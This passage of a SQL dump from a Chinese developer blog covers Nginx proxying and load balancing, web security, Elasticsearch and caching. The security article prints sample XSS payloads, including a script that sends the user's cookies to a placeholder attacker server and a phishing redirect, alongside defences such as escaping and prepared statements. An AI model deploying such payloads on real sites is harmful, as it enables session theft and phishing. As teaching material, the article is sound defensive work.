反向代理流程\n![nginxfanxiangproxy.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547020458_nginxfanxiangproxy.png)\n#### 反向代理有什么用\n1. 分担职责,减少服务器压力\n2. 是负载均衡的基础前提\n\n#### 为什么要在内网进行转发\n1. 外网无法获知真实应用服务器的地址,保障了安全性\n2. 内网的效率快速,且无需购买外网ip的费用\n\n### websocket的反向代理\n```json\nlocation /wsApi/ { // 映射前缀\n    proxy_pass http://mywebsocketaddress; // 映射目的地\n    proxy_http_version 1.1;\n    proxy_set_header Upgrade $http_upgrade;\n    proxy_set_header Connection \"upgrade\";\n}\n```\n\n## 动静分离\n### 什么是动静分离\n1. 传统网站架构模式: jsp,html,image,css,js全部放在一个服务器,把静态动态资源放在同一个服务器上\n2. 动静分离: 静态资源一个服务器,动态资源一个服务器 \n\n### 静态访问\n![nginxstatic.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547021987_nginxstatic.png)\n1. 静态即是root引导,将请求引导到某一个文件\n\n### 动静分离\n![dysstaticfenli.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547022228_dysstaticfenli.png)\n1. static.twenq.com	静态(引导至本地静态文件)\n2. www.twenq.com	动态(引导至具体应用服务器)\n3. 静态资源服务器: 使用Nginx实现静态服务器\n4. 动态资源服务器: 使用tomcat实现动态服务器', 0, 0, 56, 0, 0, '2019-01-09 14:27:50', '2019-04-16 22:57:12', 0, 0);
INSERT INTO `article` VALUES (42, 1, 'Nginx负载均衡', '2019/1/1547022576_19132347_p0.jpg', '## 概念\n### 负载均衡是什么\n1. 负载均衡,英文名称为Load Balance,其意思就是分摊到多个操作单元上进行执行,例如Web服务器、FTP服务器、企业关键应用服务器和其它关键任务服务器等，从而共同完成工作任务。\n2. 负载均衡就是,将所有请求先到负载均衡器,在由负载均衡器采用负载均衡算法(轮训、IP绑定、权重)分发到不同实际的服务器中,这也就是服务器集群,集群的目的是为了减轻单台服务器压力\n\n## 网络模型\n### 为什么要了解网络模型\n1. 负载均衡属于网络通讯,理解这些协议是基础\n2. 负载均衡分为*基于TCP的四层负载均衡*与*基于HTTP的七层负载均衡*,学习前必须理解这些协议\n\n### 网络模型图\n![netmodel.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547022991_netmodel.png)\n#### 服务器与服务器之间如何实现通讯\n1. *Ip地址*表示服务器的地址,同时也有内网与外网的概念\n2. *端口号*用于区分不同的应用程序\n3. 传输层*TCP和UDP协议*就是数据传输二进制文件流的关键,应用层所谓的*Http,websocket都是基于这两层的包装*\n\n#### TCP与UDP在概念上的区别\n1. UDP: 面向无连接,将数据及源封装成数据包中,*不需要建立连接*,因为无连接,所以不可靠,但是速度快,每个数据包大小限制在64k内\n2. TCP: 建立连接,形成传输数据的通道,*通过三次握手建立连接*,可靠,但是速度慢,进行大数据量传输,已字节流方式  \n\n### TCP的三次握手\n![tcpsanwoshou.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547023456_tcpsanwoshou.png)\n1. 第一次握手: 建立连接时,客户端发送SYN包(SYN=J)到服务器,并进入SYN_SEND状态,等待服务器确认\n2. 第二次握手: 服务器收到SYN包,必须确认客户的SYN(ACK=J+1),同时自己也发送一个SYN包(SYN=K),即SYN+ACK包,此时服务器V状态\n3. 第三次握手: 客户端收到服务器的SYN+ACK包,向服务器发送确认包,ACK(ACK=K+1),此包发送完毕后,客户端和服务器进入ESTABLISHED状态,完成三次握手\n4. 完成三次握手后,客户端与服务端开始传送数据\n\n#### 为什么要三次握手\n1. 保证安全性,建立安全的传输通道\n2. 确定对方存活,了解对方是否宕机\n\n### HTTP协议\n![http.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547023606_http.png)\n#### TCP与HTTP的区别\n1. TCP是网络模型中第四层的传输协议,是网络通讯的基础协议\n2. HTTP是对TCP进行的封装,常用于短的数据报文\n\n### TCP四层负载均衡 \n#### TCP四层负载均衡是什么\n1. 基于传输层,也叫做*基于TCP协议*实现负载均衡,LVS(软负载)和F5(硬件负载) \n2. 使用*长连接方式*,只要客户端与服务端保持连接,就不会轮询到下一台服务器\n\n#### 四层负载均衡与七层负载均衡区别\n1. 四层均衡再进行*TCP第一次握手时*,改写了SYN包,改写了目标地址,直接达到真实地址\n2. 七层均衡在*TCP三次握手后*才进行转发代理,仅仅作为代理服务器 \n\n#### 为什么四层负载均衡比七层负载均衡性能高\n1. *TCP是HTTP的底层*,在底层中进行实现显著提高性能\n2. 四层负载均衡无需等待三次握手后才行动,在第一次握手就已经开始行动了\n\n#### Nginx如何四层负载均衡\n![nginxsicengfuzaijunh.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547025050_nginxsicengfuzaijunh.png)\n#### 开启TCP四层负载均衡注意\n1. nginx1.9.0前无法使用四层负载均衡,需要借助lvs,haproxy\n2. nginx1.9.0后需要安装模块才可以实现四层负载均衡\n3. nginx1.10.0后自带负载均衡\n\n### HTTP七层负载均衡\n#### HTTP七层负载均衡是什么\n1. 基于应用层,也叫做*基于HTTP协议*实现负载均衡\n2. 当*每发一次新的数据报文*,都会轮询到下一台服务器\n3. 应用度广,但效率比TCP四层负载均衡差\n\n#### Nginx如何七层负载均衡\n![nginxqicengfuzaijunh.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547025809_nginxqicengfuzaijunh.png)\n1. nginx主要功能就是HTTP七层负载均衡,天生自带\n2. 将tcp改为http即可\n\n### 负载均衡算法与故障转移及应用服务器容灾\n#### 什么是应用服务器容灾\n1. nginx当反向代理转发到上游服务器(真实应用服务器),如果真实应用服务器出现*宕机,延迟*情况下,对方死亡,将尝试反向代理到备用的应用服务器\n2. 备机不参与负载均衡,而是为了容灾准备\n\n#### 什么是故障转移\n1. nginx当反向代理转发到上游服务器(真实应用服务器),如果真实应用服务器出现*宕机,延迟*情况下,直接轮询下一个节点\n2. 故障转移的前提是应用服务器容灾的备机也死亡\n\n#### 常见的负载均衡算法\n1. 轮询机制: 轮流访问,非常均匀.应用场景: 服务器配置相同\n2. 权重机制: 使用weight,配置比例等分.权重越高访问次数越高.应用场景: 服务器配置不相同\n3. fail机制: 根据页面大小和加载时间长短与后端服务器响应速度来分配请求,响应时间短的优先分配\n4. IpHash: 通过nginx获取的ip通过hash运算固定分配到某个服务器上,可以解决session共享问题\n5. urlHash: 通过请求url使用hash运算固定分配到某个服务器上,可以解决session共享问题\n\n#### Nginx修改负载均衡算法与故障转移\n```json\n// 使用默认轮询\nupstream backServer {\n	server 47.56.158.100:3000;\n	server 47.56.158.100:3000;\n} \n// 使用权重\nupstream backServer {\n	server 47.56.158.100:3000 weight=1;	\n	server 47.56.158.100:3000 weight=2; // 权重越高访问率越大\n} \n// 使用ipHash\nupstream backServer {\n	server 47.56.158.53:3000;\n	server 48.59.456.63:3000 backup;\n	ip_hash;\n}\n// 应用服务器容灾\nupstream backServer {\n	server 47.56.158.53:3000;\n	server 48.59.456.63:3000 backup; // 备机,不参与负载均衡\n}\n\n// nginx与上游服务器(真实应用服务器)超时时间 后端服务器连接的超时时间_发起握手等候响应超时时间\nproxy_connect_timeout 1s;\n// nginx发送给上游服务器(真实应用服务器)超时时间\nproxy_send_timeout 1s;\n// nginx接收上游服务器(真实应用服务器)超时时间\nproxy_read_timeout 1s;\n```', 1, 0, 65, 0, 0, '2019-01-09 16:29:45', '2019-06-14 15:24:56', 0, 0);
INSERT INTO `article` VALUES (43, 1, 'Web常见安全攻击手段与防御', '2019/1/1547197522_40761311_p0_master1200.jpg', '## 概念\r\n### 为什么是Web安全\r\n1. 基于Web环境的互联网应用越来越广泛，企业信息化的过程中各种应用都架设在Web平台上，Web业务的迅速发展也引起黑客们的强烈关注\r\n2. 接踵而至的就是Web安全威胁的凸显，黑客利用网站操作系统的漏洞和Web服务程序的漏洞等得到Web服务器的控制权限，轻则篡改网页内容，重则窃取重要内部数据，更为严重的则是在网页中植入恶意代码，使得网站访问者受到侵害\r\n3. 由于黑客的职业化程度越来越高，针对Web应用的攻击手段和技术日趋高明、隐蔽，致使大多Web应用处在高风险环境下开展。\r\n\r\n## 常见的Web安全问题\r\n### XSS攻击\r\n#### 什么是XSS攻击,原理是什么\r\n![xssyuanli.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547199493_xssyuanli.png)\r\n1. 使用脚本语言,在进行提交时注入一些参数,而这时数据参数可以直接在客户端中执行\r\n2. 常见使用JS脚本,因为浏览器默认支持脚本语言执行,如果在表单提交的时候,提交一些脚本参数,可在浏览器执行执行\r\n\r\n#### XSS攻击漏洞常见用途\r\n![xsscookie.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547201831_xsscookie.png)\r\n![xsschangjian.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547201644_xsschangjian.png)\r\n1. 注入让客户端崩溃的代码,比如无限循环\r\n2. 盗取cookie收集起来,冒充用户伪造请求等操作\r\n3. 注入挖矿代码,榨干计算机性能\r\n4. 发送钓鱼网站链接,提交参数带上XSS脚本攻击,比如进入假的支付平台\r\n\r\n```html\r\n// 评论中注入JS脚本,比如让客户端陷入循环崩溃\r\n<script>while(1) {console.log(\'哈哈哈哈\');}</script>\r\n\r\n// 注入挖矿代码,榨干计算机性能\r\n<script> 挖矿代码 </script>\r\n\r\n// 盗取cookie收集起来,冒充用户伪造请求等操作\r\n<script>\r\n	var allcookies = document.cookie\r\n	window.open(\'http://黑客服务器:8080/cookie.asp?msg=\' + allcookies)\r\n</script>\r\n\r\n// 发送钓鱼网站链接,提交参数带上XSS脚本攻击,进入假的支付平台\r\npay.zhifubao.com?userId=1&s=<script>window.location.href=\'http://diaoyuwangzhan.com\'</script>\r\n```\r\n\r\n#### 防范XSS\r\n1. 像一些特殊字符,比如<,>,如果不进行特殊字符处理的话,很有可能受到XSS攻击\r\n2. 将特殊字符转换,防止XSS攻击\r\n3. *写一个过滤器,把这些特殊字符统一处理一下*\r\n4. *客户端与服务端双方都要处理一下*\r\n\r\n```javascript\r\n<script>\r\n// 转换一下\r\n&lt; script &gt;\r\n\r\n// 远远不止这种格式的特殊字符,有各种千奇百怪的特殊字符\r\n// 使用专门处理特殊符号的工具类解决,比如Java的commonsLang包\r\nString name = \"<script>alert(\'哈哈哈\');</script>\";\r\nSystem.out.println(StringEscapeUtils.escapeHtml(name));\r\n// 转换后\r\n&lt;script&gt;alert(\'&#21704;&#21704;&#21704;\');&lt;/script&gt; \r\n```\r\n\r\n### SQL注入\r\n#### 什么是SQL注入,原理是什么\r\n![sqlinjection.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547203473_sqlinjection.png)\r\n1. 黑客提交不正常的SQL关键字数据,如果服务端不注意,那么就会产生SQL注入问题\r\n2. 如果程序代码中,持久层sql语句如果直接拼接方式执行,会造成SQL注入问题\r\n3. 轻则泄漏信息,重则删库\r\n\r\n#### 防范SQL注入\r\n1. 持久层的SQL语句使用预编译方式,不要直接拼接完再执行\r\n2. 预编译会将敏感内容当作普通的字符串进行处理,而不是当成SQL关键字\r\n\r\n```java\r\n// Java的JDBC预编译\r\nconnection = DriverManager.getConnection(url, username, password);\r\nps = connection.prepareStatement(\'SELECT id, telephone FROM users WHERE nickname = ?\');\r\nps.setObject(param.getNickname()); // 填充并预编译\r\nps.executeQuery(); // 执行\r\n```\r\n\r\n### 重复提交\r\n#### 什么是重复提交\r\n![chongfutijiao.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547204846_chongfutijiao.png)\r\n1. 多次提交同一种操作,使数据库增大冗余\r\n2. 重复提交相同的订单,恶意攻击,使数据库硬盘爆满\r\n\r\n#### 临时令牌防范重复提交方案\r\n![chongfutijiaolingpai.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547206657_chongfutijiaolingpai.png)\r\n1. 使用临时令牌,每次提交前获取新的临时令牌\r\n2. 提交时必须携带服务端承认的临时令牌才行\r\n3. 解决了恶意攻击者无脑地接口重复提交攻击\r\n\r\n### CSRF伪造请求\r\n#### 什么是CSRF,作用是什么\r\n![csrfgji.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547208806_csrfgji.png)\r\n1. 假设黑客已经得逞,会话信息的Token已经被黑客收集起来了\r\n2. 那么黑客可以用收集起来的Token信息来大规模地进行模拟请求,恶意攻击\r\n3. 若没有对应策略,系统会变得极其容易被利用\r\n\r\n#### 防范CSRF\r\n![cxrffangan.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547211460_cxrffangan.png)\r\n1. 互联网上没有绝对能防止黑客抓包分析的方案\r\n2. *在核心业务接口上一定要确定是本人操作*\r\n3. *非核心业务短时间限制次数,超出限制弹出确认是否是本人操作*\r\n4. 使用发送*短信验证码方式*或者*图像识别方式*确认是本人在操作\r\n5. *小心穷举的暴力破解*,当错误次数累计到一定程度立刻冻结账号并向用户发送提醒被盗号短信\r\n\r\n### 对称加密不安全\r\n#### 对称加密为什么不安全\r\n![duichengjiami.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547289858_duichengjiami.png)\r\n1. 移动App接口不能采用对称加密\r\n2. 因为对称加密密钥都是相同的\r\n3. 如果黑客反编译破解APK拿到密钥,那么黑客就知道整个加解密过程\r\n4. 效率高,服务端与服务端间进行通讯加密\r\n\r\n#### 使用非对称加密\r\n![feiduichengjiami.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547289906_feiduichengjiami.png)\r\n1. 使用第三方工具生成非对称密钥对\r\n2. 分为一对密钥(必须公钥与私钥进行组合)\r\n3. 使用公钥加密,必须用私钥解密(更安全,公钥会被公开的)\r\n4. 使用私钥加密,必须用公钥解密\r\n5. 目前来说是最安全的加密手段\r\n6. 注意url特殊字符转换\r\n7. 效率低,适用第三方支付对接,核心金融机构对接', 1, 0, 78, 0, 0, '2019-01-11 16:59:21', '2019-02-22 00:27:29', 0, 0);
INSERT INTO `article` VALUES (44, 1, 'Web常见安全漏洞', '2019/1/1547211260_49656023_p0_master1200.jpg', '## 概念\r\n### 什么是Web安全漏洞\r\n1. 一些在开发人员开发中难以察觉的安全漏洞\r\n2. 这些漏洞可以被黑客有效利用获取信息,造成系统损失\r\n\r\n## 常见的安全漏洞\r\n### 验证码被暴力穷举\r\n#### 位数验证码找回密码\r\n![zhaohuimima.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547212127_zhaohuimima.png)\r\n1. 使用短信验证码或邮箱(内容中有一个六位验证码)\r\n2. 根据输入的验证码确定是用户本人在操作\r\n3. *大部分中小网站没有做此处的暴力穷举破解防范*\r\n\r\n#### 暴力穷举验证码\r\n![qionjupojie.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547213941_qionjupojie.png)\r\n1. 在没有重试限制冻结操作的情况下,那么这就很容易暴力破解\r\n2. 写程序开多线程,就可暴力穷举六位之内所有验证码00000-999999\r\n3. 仅仅六位以内的数字可以在短时间内快速全部穷举\r\n\r\n#### 如何防范暴力穷举\r\n1. 配置防止DDOS,限制IP访问\r\n2. 黑名单和白名单(设置某些IP的权限)\r\n3. 错误计数机制,当错误达到一定程度立刻冻结账号,并发送短信给用户被盗号信息\r\n\r\n### 隐藏域漏洞\r\n![yinchangyuloudong.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547215207_yinchangyuloudong.png)\r\n#### 值传递时千万不要用隐藏域,不要相信隐藏域\r\n1. 隐藏域的内容可以被直接修改\r\n2. 如果代码逻辑依靠隐藏域的数据进行用户操作,那么就可以冒充其他用户进行操作\r\n3. 用JSP的小型网站可能有这样的漏洞\r\n\r\n### 上传文件漏洞\r\n#### 如何利用上传漏洞格式化服务器硬盘\r\n![uploadloudong.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547216239_uploadloudong.png)\r\n1. 上传文件时服务端没有限制格式,导致上传任意文件\r\n2. 黑客上传可执行木马文件,比如删盘,可能会导致格式化整个服务器硬盘\r\n3. 先上传木马文件,再根据地址去访问木马文件(一次即可)\r\n4. 很少数网站会出现这样的漏洞\r\n\r\n#### 防范上传漏洞\r\n1. 不要单纯只判断后缀\r\n2. 上传图片时,一定要*判断文件流*确定知道它一定是一张图片或无威胁文件\r\n3. 静态资源与动态资源尽量分开服务器执行\r\n4. 服务器环境上硬盘不能做删除操作\r\n5. 尽管无法防范接口,客户端上传时就应该做后缀限制\r\n6. 服务器关闭热部署功能\r\n\r\n### 页面参数跳转\r\n#### 跳转页面时直接携带参数后果\r\n![yemianurltiaohzuan.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547293701_yemianurltiaohzuan.png)\r\n1. 将敏感关键的参数暴露在url上\r\n2. 抓包后可以顺便修改\r\n3. 有些网站单点登录会直接把许多关键参数暴露出来造成这种情况\r\n\r\n#### 生成token,使用token进行携带跳转,避免这种情况\r\n![tokentiaohzuan.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547293701_tokentiaohzuan.png)\r\n1. 将敏感信息转换为Token\r\n2. 使用token进行携带跳转\r\n3. 即使被抓包被无法找到内容如何修改\r\n4. 但在检查支付结果时,必须比对详细金额等敏感信息是否正确', 1, 0, 47, 0, 0, '2019-01-11 20:54:26', '2019-02-22 00:27:40', 0, 0);
INSERT INTO `article` VALUES (45, 1, 'elasticsearch原理概念与集群分片', '2019/4/1555160424_45fb37f87fe539b331f7f839ba315dc0.jpg', '## 概念与介绍\n### 框架介绍\n#### elasticsearch是什么\n1. es是一个*基于luncene*构建的开源,分布式,restful接口全文搜索引擎\n2. es是一个分布式文档数据库,其中每个字段均是被索引的数据且可被搜索,它能够扩展至数以百计的服务器存储以及处理PB级的数据\n3. es是一个分布式全文检索框架,隐藏复杂处理机制,内部使用*分片机制*,集群发现,分片负载均衡技术路由\n4. es可以在很短的时间内存储,搜索和分析大量的数据,它通常作为具有复杂搜索场景情况下的核心发动机\n5. *与solr都是基于luncene*,但elasticsearch显得轻巧,简易\n\n#### elasticsearch特点\n1. 横向扩展: 只需要增加服务器,做些配置,启动一些elasticsearch就可以并入集群,elasticsearch集群性能极佳\n2. *分片机制提供更多的分布性*: 同一个索引分成多个分片,这点类似于HDFS的块机制,分而治之方式提升处理效率\n3. 高可用: 提供复制机制,一个分片可以设置多个复制,使得某台服务器在宕机的情况下,集群仍旧可以照常运行,并且会将服务器宕机丢失的数据信息复制恢复到其他可用节点上\n\n#### elasticsearch应用场景\n1. 网站站内搜索\n2. 网盘搜索引擎\n3. 大型电商商品搜索系统\n4. 大型分布式日志分析系统ELK,elasticsearch(存储日志)+logstash(收集日志)+kibana(展示数据)\n\n### 搜索原理\n#### 倒排索引结构\n1. 因为基于luncene,全文检索的倒序索引理念与luncene相同\n2. *正排索引结构*是穷举每一个文档,从每个文档找到相应内容,效率极差\n3. *倒排索引结构是根据内容(词语)找文档,这种索引的结构叫做倒排索引结构*\n4. 倒排索引结构具体详细参考 https://blog.tuwq.cn/article/39 及网上其他资料 \n\n#### 为什么倒排索引比数据查询速度快\n1. *数据库查询的结构为B+树,但B+树的效率并没有倒排索引速度迅速*\n2. 将搜索内容进行关键字分词,通过关键字分词定位到文档内容,倒排索引速度是极快的,即使需要在上千万的数据中查找内容,对于倒排索引来说只需要9毫秒左右\n\n#### elasticsearch如何做到修改时的并发问题\n1. 采用CAS乐观锁的机制\n2. 数据version自增长,修改数据后,version会自动加1\n\n## 结构与简单操作\n### 存储结构单位\n#### 字段,字段类型,文档\n```json\n      \n{\n    \"user\":{ // 类型对象\n        \"properties\":{\n            \"age\":{\n                \"type\":\"long\"\n            },\n            \"name\":{ // 字段名\n                \"type\":\"text\", // 字段类型\n                \"analyzer\":\"ik_smart\" // 指定分词解析器\n            },\n            \"birthday\":{\n                \"type\":\"keyword\"\n            }\n        }\n    }\n}\n```\n1.  elasticsearch是面向文档型数据库,*一条数据在这里就是一个文档,用JSON作为文档序列化的格式*\n2. 类型指的是文档的类型,查询时会依据这些类型进行不同的处理\n3. 数字默认映射为long类型,字符串分为text和keyword,*text会进行分词,keyword不会进行分词*\n\n#### 文档映射\n1. 静态映射: 在elasticsearch中也可以事先定义好映射,包含文档的各个字段的类型和指定分词解析器等,这种方式称为静态映射(推荐)\n2. 动态映射: elasticSearch中不需要事先定义映射,文档写入elasticsearch时,会根据文档字段自动识别类型,这种机制称为动态映射\n\n#### 结构单位\n2. 关系数据库: 字段 => 行 => 表 => 数据库 \n3. elasticsearch: 字段 => 文档 => 类型对象 => 索引\n\n### 简单操作\n#### 创建\n```json\n	PUT /mytest   		// 创建索引\n	PUT /mytest/user 	// 类型对象\n	PUT /mytest/user/1 { 	// 创建文档 \n		\"name\": \"tuwq\", \n		\"age\": \"20\",\n		\"birthday\": \"1203\"\n	}\n```\n#### 删除\n```json\n	DELETE /mytest  // 删除索引及索引下所有文档\n```\n#### 修改\n```json\n	POST mytest/user/1/_update { // 修改某文档的字段信息\n    		\"doc\" : {\n        		\"name\" : \"tuwq\",\n				\"age\": \"21\"\n    		} \n	}\n	POST /mytest/_mapping/user { // 修改字段映射设置\n    		\"user\":{ // 类型对象\n        		\"properties\":{\n            			\"age\":{\n                			\"type\":\"long\"\n            			},\n            			\"name\":{ // 字段名\n                			\"type\":\"text\", // 字段类型\n                			\"analyzer\":\"ik_smart\" // 指定分词解析器\n            			},\n            			\"birthday\":{\n                			\"type\":\"keyword\"\n            			} \n        		 }\n    		}\n}\n```\n#### 查询\n```json\n	GET /mytest/user/1 // 某文档所有字段\n	GET /mytest/user/_mget { \"ids\": [\"1\",\"2\"]} // 根据多id查询文档\n	GET /mytest/user/_search // 某索引下全部文档\n	GET /mytest/user/_search?q=age:21 // 某索引下所有文档进行年龄查询\n	GET /mytest/user/_search?q=age[30 TO 60] // 某索引下所有文档进行年龄区间查询\n	GET /mytest/user/_search { // 精确查询姓名\n    		\"query\":{\n        		\"term\":{ // term完全精确匹配\n            			\"name\":\"tuwq\"\n        		 }\n    		}\n	}\n	GET /mytest/user/_search { // 模糊查询汽车名称\n    		\"query\":{\n        		\"match\":{ // 模糊匹配,并会进行分词器分析\n            			\"car\":\"特斯拉\"\n        		 }\n    		}\n	}\n	GET /mytest/user/_search { // 模糊查询汽车名称并分页\n    		\"from\":\"0\", // 相当于mysql的limit中的skip\n    		\"size\":\"2\",// 相当于mysql的limit中的size\n    		\"query\":{\n        		\"match\":{ // 模糊匹配,并会进行分词器分析\n            			\"car\":\"保时捷\"\n				 }\n        	}\n    } \n    GET /mytest/_mapping // 查询映射信息,相当于数据库查看设计字段信息\n}\n```\n1. DSL查询: 使用JSON完整的请求体叫做结构化查询(DSL),dsl查询更为直观也更简易,所有大都使用这种方式,dsl查询是post过去一个json,由于post请求是json格式,所以存在很多灵活性,也有很多形式\n2. *term完全精确匹配*查询姓名,即不进行分词器分析,文档中必须包含整个搜索词汇\n3. *match相当于模糊匹配*,会进行分词器分析,只包含其中一部分关键词即可\n\n## 集群\n### 集群原理\n#### es为什么要集群\n1. 在单台es服务器节点上,随着业务量的发展索引文件慢慢增多,会影响到效率和内存存储问题等\n2. 采用es集群,将单个索引的分片到多个不同分布式物理机器上存储,从而实现高可用,容错性等\n3. 如果es实现了集群的话,会将单台服务器节点的索引文件使用分片技术,分布式存放在多个不同的物理机器上\n4. 运行分片机制将数据拆分成多台节点进行存放\n5. 在es分片技术中,分为主分片(primaryshards),副本分片(replicas)\n6. 9300端口: ES节点之间通讯使用,ES集群之间TCP协议通讯端口号,9200端口: ES节点和外部通讯进行数据操作的端口,暴露restful接口api\n\n#### 集群原理-分片\n![esfenpian.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1555217286_esfenpian.png)\n1. 每个索引会被分成多个分片shard进行存储,默认创建索引是五个分片进行存储,每个分片都会分布式部署在多个不同的节点上进行部署,*该分片成为primaryshards主分片(索引的主分片数量定义好后,不能被修改)*\n2. 每一个主分片为了实现高可用,都会有自己对应的备份分片,*主分片对应的备分片不能存放在同一台服务器上,主分片可以和其他非对应的备分片存放在同一个node节点上*\n3. *shards分片*: 代表索引分片,es可以把一个完整的索引分成多个分片,这样的好处是可以把一个大的索引拆分成多个,分布到不同的节点上,构成分布式搜索\n4. *replicas分片*: 代表索引副本,es可以设置多个索引的副本,副本的作用一是提高系统的容错性,当某个节点某个分片损坏或丢失时可以从副本中恢复,二是提高es查询效率,es会自动对搜索请求进行负载均衡\n5. 索引 = number_of_shards 5主分片 + number_of_replicas 1副分片  \n *表示总共10个分片,每个主分片都会对应一个副分片*\n6. 索引 = number_of_shards 5主分片 + number_of_replicas 2副分片   \n *表示总共15个分片,每个主分片都会对应一个副分片*\n7. *主分片的数量只能在索引创建前指定,并且索引创建后不能更改*\n8. 默认分片数为*节点的平方*,比如5的平方=25\n9. 查询索引信息127.0.0.1:9200/myindex/_setting\n\n\n### 集群问题\n#### 主分片对应的备分片不能够在同一台节点上进行存放\n![esqa1.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1555220415_esqa1.png)\n1. es为了高可用,每个主的分片都会对应有一个备份的分片\n2. *单台es服务器中是没有备用分片的*,因为主分片对应的备分片不能够在同一台节点上进行存放\n3. 主备分片之间进行实时刷新同步,类似于mysql主从复制的binlog二进制传输\n4. 主分片可以和其他非对应的备分片存放在同一个node节点上\n5. 查询时会在主备所在的node节点中进行负载均衡轮询\n\n#### 索引的主分片数量定义好后,不能被修改\n1. documentrouting数据路由\n2. 当客户端发起创建document的时候,es需要确定这个document放在哪个index上的哪个shard上,这个过程就是数据路由\n3. 路由算法: shard = hash(routing)(分片id)%number_of_primary_shards\n4. *如果number_of_primary_shards在查询时候取余时发生变化,那么将会无法获取到该数据*', 1, 0, 35, 0, 0, '2019-04-13 21:00:57', '2019-04-14 13:41:19', 0, 0);
INSERT INTO `article` VALUES (46, 1, '缓存技术与适用场景', '2019/4/1555336910_d905fce206b20c656290e95167620bd0.jpg', '## 概念\n### 介绍\n#### 什么是缓存\n1. 减轻机器压力,减少网络传输的请求\n2. 缓存是容器是存放在内存,但为了保证持久化机制,将缓存中的值的持久化到硬盘上(日志缓存文件格式)\n3. 缓存框架都是支持对内存和硬盘的支持\n\n#### 缓存应用场景\n1. 浏览器访问图片\n2. CDN内容分发\n3. 代理缓存(Nginx)\n4. 浏览器,App客户端(安卓,IOS),底层缓存技术\n5. 避免数据频繁访问的机器压力\n\n#### 缓存类型\n1. 底层缓存: 浏览器底层缓存,系统底层缓存,CPU缓存\n2. 网络缓存: 代理缓存,CDN缓存\n3. 应用级缓存: 代码控制级缓存,如浏览器localstorage,服务端Redis\n\n## 底层缓存\n### 浏览器缓存\n1. 浏览器底层缓存机制稍为复杂,通过各缓存位置及HTTP协议提供\n2. 建议详细内容参见其他博客 https://www.jianshu.com/p/54cc04190252\n\n### CPU缓存\n1. CPU缓存的目的是为了缓解CPU与内存速度不匹配的问题\n2. CPU缓存偏软件并发与硬件底层,与C/C++知识接近\n3. 对硬件及C/C++未有深入了解,只了解大概,待不涉及\n\n## 网络缓存\n### 代理缓存\n#### 代理缓存是什么\n![cache4.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1555425163_cache4.png)\n1. 代理缓存属于网络缓存,是一种很简单有效的网络缓存技术方式\n2. 代理缓存位于内容源服务器和客户端之间,当用户访问一个URL时,代理缓存服务器会去后端源服务器取回要输出的内容,然后,当下一个请求到来时,如果访问的是相同的URL，代理缓存服务器直接输出内容给客户端,而不是向源服务器再次发送请求.代理缓存降低了内容源服务器,数据库的负载,减少了网络延迟,提高了用户访问的响应速度,增强了用户体验\n3. Squid,Nginx等都提供代理缓存的功能\n\n### CDN缓存\n#### CDN缓存(内容分发)是什么\n1. CDN内容分发其实本质可以理解为类似于Redis缓存,CDN其实本质是可以实现静态资源缓存\n2. 减少服务器传输的速度,让用户到最近的服务器上进行访问\n\n#### CDN原理过程\n![cdncache.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1555421927_cdncache.png)\n1. CDN获取客户端的ip地址,实现动态化(DNS负载均衡),根据客户端ip地址判断CDN内容分发服务器距离\n2. 判断CDN服务器与客户端最近的距离是哪台CDN服务器让客户端从最近的CDN服务器进行访问,目的能实现减轻宽带传输,提高网站吞吐量\n3. CDN与代理缓存相似,当用户访问一个URL时,CDN服务器会去后端源服务器取回要输出的内容,然后,当下一个请求到来时,如果访问的是相同的URL，CDN服务器直接输出内容给客户端\n4. CDN在代理缓存基础上强调了地区概念从而达到最近最优的缓存服务器,除此之外CDN提供额外功能,如防止DDOS,DNS负载均衡,Web拦截防御,黑名单与白名单\n\n#### 主要应用场景\n1. 缓存资源image,css,js,视频云产生\n2. 视频直播网站等高流量需求对CDN要求特别高\n\n## 应用级缓存\n#### 应用级缓存\n1. 一般程序员所使用的缓存技术,框架都属于应用代码级控制缓存\n2. *单点内置缓存*(只针对单个应用自身的缓存,比如Java的缓存缓存至本身JVM中,每个JVM互不影响,再比如浏览器localstorage缓存) \n3. *分布式缓存*(应用集群的中间件,共享缓存的中间件,类似框架如redis,menchache)\n\n### 单点内置缓存\n#### 单点内置缓存是什么\n1. 局限单服务应用的内置缓存技术或框架,可在单应用中进行缓存\n2. 无法多应用机器中共享,但可减少机器压力,提升效率与用户体验性\n\n#### 缓存基本应用\n![ehcache1.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1555339616_ehcache1.png)\n1. 缓存基本应用如此,当存在缓存时直接获取,而无需再次查询数据库造成机器压力\n2. 缓存数据需设置过期时间或修改后进行消息通知,否则造成数据不一致\n\n#### 如何解决缓存与数据不同步问题\n1. 主动消息通知,发生修改时,先进行修改,后清理缓存\n2. 设置过期时间,一定时间内缓存将会过期\n3. 定时任务检查数据一致性清理缓存\n\n### 分布式缓存\n#### 分布式缓存\n![cache2.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1555340843_cache2.png)\n1. 